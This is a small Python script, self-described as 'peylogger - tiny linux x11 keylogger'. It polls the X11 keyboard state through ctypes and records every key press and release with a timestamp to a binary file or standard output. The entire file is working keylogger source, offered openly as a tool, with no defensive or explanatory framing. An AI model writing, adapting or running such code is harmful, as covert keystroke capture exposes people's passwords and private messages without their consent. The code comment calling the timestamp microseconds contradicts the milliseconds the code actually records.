import sys
from time import sleep
import ctypes as ct
from ctypes.util import find_library
from time import time
from struct import pack

assert("linux" in sys.platform)


x11 = ct.cdll.LoadLibrary(find_library("X11"))

# unsigned char key, bool pressed, int timestamp (microsec)
struct_format = 'B?L'


def fetch_keys(sleep_interval=0.005):
    display = x11.XOpenDisplay(None)
    keyboard = (ct.c_char * 32)()
    prev_states = 0
    while True:
        sleep(sleep_interval)
        x11.XQueryKeymap(display, keyboard)
        for i,byte_str in enumerate(keyboard):
            byte = ord(byte_str)
            offset = 1
            for bit in range(8):
                position = 8*i+bit
                c = byte & (offset << bit)
                prev_state = prev_states & (offset << position)
                if c and prev_state or not c and not prev_state:
                    continue
                prev_states = prev_states ^ (offset << position)
                yield (position,bool(c))


def log(output_file, sleep_interval=0.005):
    for key,pressed in fetch_keys():
        output_file.write(pack(struct_format, key, pressed, int(time()*1000)))
        output_file.flush()

def argparser():
    import argparse
    argp = argparse.ArgumentParser(description='peylogger - tiny linux x11 keylogger')
    argp.add_argument('-o', '--output'
                     ,help      = 'Output file - default is STDOUT'
                     ,metavar   = 'FILE'
                     ,default   = sys.stdout
                     ,type      = argparse.FileType('w')
                     )
    return vars(argp.parse_args())

def __main__():
    args = argparser()
    log(args['output'])

if __name__ == "__main__":
    __main__()
